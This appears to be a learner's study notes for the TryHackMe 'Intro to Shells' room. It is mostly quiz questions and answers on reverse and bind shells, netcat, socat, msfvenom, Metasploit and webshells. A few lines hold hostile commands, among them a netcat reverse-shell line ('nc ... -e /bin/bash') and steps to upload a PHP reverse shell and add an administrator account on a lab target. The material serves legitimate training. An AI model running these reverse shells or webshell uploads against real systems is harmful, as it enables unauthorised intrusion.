...
tags:       ["tryhackme"]
identifier: "20250321T000001"
Hubs: "TryHackMe/Jr Penetration Tester/Privilege Escalation"
urls: (https://tryhackme.com/room/introtoshells)
id: 73229b83-bac1-4b1d-b19b-44f3af49d882
---
...
**Question:** Read and understand the introduction.
...
**Question:** Read the above and check out the links!
...
![Image 1](https://i.imgur.com/rN7YkJJ.png)
...
![Image 2](https://i.imgur.com/6GUwZsw.png)
...
![Image 3](https://i.imgur.com/0ayLj8L.png)
...
![Image 4](https://i.imgur.com/rXyEDKU.png)
...
**Question:** Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?

*Answer:* 

     R

**Question:** You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)

*Answer:* 

     N

**Question:** When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?
...
**Question:** Which option tells netcat to listen?

*Answer:* 

     -l

**Question:** How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?
...
![Image 5](https://i.imgur.com/bQnFz1T.png)
...
![Image 6](https://i.imgur.com/7aOKtlO.png)
...
**Question:** How would you change your terminal size to have 238 columns?

*Answer:* 

     stty cols 238

**Question:** What is the syntax for setting up a Python3 webserver on port 80?
...
![Image 7](https://i.imgur.com/etAuYzz.png)
...
**Question:** How would we get socat to listen on TCP port 8080?
...
![Image 8](https://i.imgur.com/UbOPN9q.png)
...
**Question:** What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

*Answer:* 

     socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

**Question:** If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
...
![Image 9](https://i.imgur.com/se5Fyn3.png)
...
![Image 10](https://i.imgur.com/Xf0hA5p.png)
...
![Image 11](https://i.imgur.com/T6o7kOL.png)
...
**Question:** What command can be used to create a named pipe in Linux?

*Answer:* 

     mkfifo

**Question:** Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself with the languages available.
...
![Image 12](https://i.imgur.com/JkWeFLq.png)
...
![Image 13](https://i.imgur.com/iFO6ydX.png)

This gives us a full set of Linux meterpreter payloads for 32bit targets.

### **Answer the questions below**

**Question:** Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.

*Answer:* 

     No answer needed

**Question:** Which symbol is used to show that a shell is stageless?

*Answer:* 

     _

**Question:** What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
...
![Image 14](https://i.imgur.com/rAdZsKH.png)
...
![Image 15](https://i.imgur.com/qIr6o2B.png)
...
![Image 16](https://i.imgur.com/COmVX8K.png)
...
**Question:** What command can be used to start a listener in the background?

*Answer:* 

     exploit -j

**Question:** If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
...
There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a *webshell* . See the [Upload Vulnerabilities Room](https://tryhackme.com/room/uploadvulns) for a more extensive look at this concept.
 ...
 ![Image 17](https://i.imgur.com/W19gHwL.png)
...
**Question:** Read the WebShells information.
...
**Question:** Read the above information
...
**Question:** Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.

*Answer:* 

     No answer needed

**Question:** Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

*Answer:* 

     No answer needed

**Question:** Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

*Answer:* 

     No answer needed

**Question:** Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

*Answer:* 

     No answer needed

**Question:** Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.

*Answer:* 

     No answer needed

**Question:** Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

*Answer:* 

     No answer needed

**Question:** Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

*Answer:* 

     No answer needed

**Question:** The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

*Answer:* 

     No answer needed

**Question:** Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

*Answer:* 

     No answer needed

**Question:** Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

*Answer:* 

     No answer needed

**Question:** Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
...
Start MachineThe box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:
...
Start MachineThis task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:
